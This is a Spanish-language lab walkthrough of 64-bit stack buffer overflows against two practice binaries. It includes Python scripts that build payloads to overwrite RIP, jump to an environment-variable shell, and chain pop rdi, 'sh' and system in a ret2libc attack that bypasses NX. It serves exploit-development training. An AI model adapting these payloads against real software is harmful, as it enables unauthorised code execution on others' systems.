# Buffer-OverFlow 64bits

# CLASSIC

[classic.rar](/assets/images/Buffer-Overflow-64bits/classic.rar)

Comprobamos que el ASLR este desactivado.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled.png)

Con ghidra podemos ver el codigo fuente del binario, y vemos que la funcion main llama a una funcion vuln.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%201.png)

El codigo de vuln vemos que tiene seteado un buffer de 400 y utiliza la funcion puts la cual se considera insegura.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%202.png)

Con gdb podemos un breakpoint in main y creamos un pattern de 400

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%203.png)

Ejecutamos el programa y le pasamos ela rchivo buffer donde hemos almacenado nuestro pattern

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%204.png)

“c” para continuar

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%205.png)

Hemos sobreescrito algunas partes del programa pero RIP aun no. Sacamos la direccion de RSP y miramos cuanto es el offset.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%206.png)

Probamos a sobreescribir el RSP con “B”.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%207.png)

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%208.png)

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%209.png)

Creamos un script para crear el payload y poder sobreescribir el RIP

```python
#!/usr/bin/python3
from struct import pack

buffer = b"A"*104
buffer += pack("<Q", 0x42424242)
buffer += pack("<Q", 0x42424242)
buffer += b"C"*288

prueba = open("buffer-rip.txt", "wb")
prueba.write(buffer)
```

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2010.png)

Conseguimos sobreescribir el RIP, ahora tenemos que aprovecharnos del environment del user para añadir un envinronment malicioso y asi llamarlo desde nuestro payload

[https://www.exploit-db.com/exploits/42179](https://www.exploit-db.com/exploits/42179)

Utilizo la llamada a bash del exploit y lo incorporo a mi env de mi user:

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2011.png)

Con esta herramienta sacamos la direccion en la que hace una llamada al env nuestro programa.

[https://raw.githubusercontent.com/historypeats/getenvaddr/master/getenvaddr.c](https://raw.githubusercontent.com/historypeats/getenvaddr/master/getenvaddr.c)

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2012.png)

La añadimos a nuestro script que nos crea una rchivo con el payload malicioso

```python
#!/usr/bin/python3
from struct import pack

buffer = b"A"*104
buffer += pack("<Q", 0x7fffffffc0a8)
buffer += b"C"*288

prueba = open("buffer-rip.txt", "wb")
prueba.write(buffer)
```

Para poder ejecutarlo utilizamos la siguiente string y ejecutamos el programa, y obtenemos una bash.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2013.png)

# RET2LIBC

[ret2libc.rar](/assets/images/Buffer-Overflow-64bits/ret2libc.rar)

Con ghidra leemos el codigo de ret2libc y es igual a classic.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2014.png)

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2015.png)

Lo unico que cambia es que este binario tiene la proteccion NX (no execution) habilitada.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2016.png)

Para bypassear esta restriccion, buscamos con ropper una direccion que contenga rdi.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2017.png)

Apuntamos la direccion de pop rdi, sacamos la direccion de system y de sh

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2018.png)

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2019.png)

Construimos el script para generar una rchivo con un payload malicioso.

```python
#!/usr/bin/python3
from pwn import *
from struct import pack

#direcciones
	#p.system= 0x7ffff7e1b860
 	#pop.rdi= 0x4006a3
 	#sh= 0x6006ff
#rop = pop.rdi+sh+p.system

buffer = b""
buffer += b"A"*104
buffer += pack("<Q", 0x4006a3)
buffer += pack("<Q", 0x6006ff)
buffer += pack("<Q", 0x7ffff7e1b860)

prueba = open("buffer.txt", "wb")
prueba.write(buffer)
```

Lo ejecutamos como anteriormente y obtenemos una bash de nuevo.

![Untitled](/assets/images/Buffer-Overflow-64bits/Untitled%2020.png)